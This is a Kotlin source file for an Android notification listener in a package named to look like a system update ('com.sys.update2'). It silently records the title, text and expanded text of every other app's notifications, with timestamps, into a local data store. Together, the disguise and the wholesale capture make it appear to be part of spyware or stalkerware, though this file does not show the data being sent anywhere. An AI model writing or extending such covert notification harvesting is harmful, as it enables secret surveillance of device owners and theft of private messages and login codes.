package com.sys.update2

import android.app.Notification
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class NotifListener : NotificationListenerService() {

    private val timeFmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (sbn == null) return
        try {
            val extras: Bundle = sbn.notification.extras
            val pkg = sbn.packageName ?: "unknown"
            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
            val subtext = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString() ?: ""
            val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""

            if (pkg == packageName) return

            val entry = JSONObject().apply {
                put("type", "notification")
                put("time", timeFmt.format(Date()))
                put("package", pkg)
                put("title", title)
                put("text", text)
                put("subtext", subtext)
                put("bigtext", bigText)
            }
            DataStore.appendNotification(this, entry)
        } catch (e: Exception) {
            Log.e("NotifListener", "err: ${e.message}")
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
    }
}
